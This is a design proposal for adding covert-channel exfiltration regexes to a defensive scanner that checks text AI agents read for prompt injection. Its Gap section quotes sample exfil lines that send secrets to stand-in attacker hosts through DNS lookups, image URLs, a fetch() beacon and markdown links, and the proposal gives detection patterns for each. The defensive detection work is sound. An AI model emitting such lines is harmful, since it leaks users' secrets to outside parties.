# 002 — Covert-channel exfil patterns in L1a

**Status:** proposal
**Source:** SOTA-vs-setup review of `repo-check` Phase C honeypot
(2026-04-28). Cross-ref: `repo-check/proposals/002`.

## Gap

`L1a/regex` patterns target role-swap, system-tag injection, and
direct exfil URLs. Standard covert-exfil patterns are not
modeled:

- DNS exfil — `socket.gethostbyname(f"{secret}.attacker.com")`
  embedded in tool-result or report text
- Image-URL exfil — `![](https://x.example/?k={secret})` or HTML
  `<img src="...?k={secret}">`
- Error-message embedding — `raise Exception(f"... {secret} ...")`
  expecting host log capture
- Beacon URL — `fetch('https://attacker.com/beacon?d={secret}')`
- Markdown link auto-fetch — some renderers prefetch
  `[click](url-with-secret)`

## Why it matters

OWASP LLM Top 10 (LLM06 sensitive info disclosure) names
log/error embedding explicitly. AgentDojo (ETH Zurich, 2024) and
the Greshake et al. indirect-injection paper both treat URL-fetch
as a primary exfil vector. A scanner that only models obvious
exfil URLs leaves the standard fallback paths uncovered.

## Proposal

Add a `covert_channels` regex pack to `L1a`. Each pattern reports
which channel matched, so operators can prioritize:

| Channel | Regex sketch |
|---|---|
| dns_subdomain | `[A-Za-z0-9+/=]{20,}\.[a-z0-9-]+\.[a-z]{2,}` near socket/dns words |
| image_url | `!\[[^\]]*\]\(https?://[^)]*\)` with high-entropy query param |
| error_embed | `(raise|throw|except)\b.{0,50}(token|key|secret|api)` near long-string interpolation |
| beacon | `fetch\(\s*['"]https?://[^'"]*\?[^'"]*[A-Za-z0-9+/=]{16,}` |
| md_link | `\]\(https?://[^)]*\?[^)]*[A-Za-z0-9+/=]{16,}\)` |

Each match is a finding, not a hard block — let the consumer
decide gating. Pair with `L1b/secret_shapes` to upgrade severity
when the embedded value also matches a known shape.

## Effort

~50 lines + 5 regex unit tests. Optional follow-up: domain
allowlist so legit GitHub / npm / pypi URLs don't trip beacon
pattern.

## Risk if skipped

The most common 2025-era exfil patterns are invisible to L1a.
Defensive value claimed by callers (`repo-check`, `research-agent`)
is overstated.
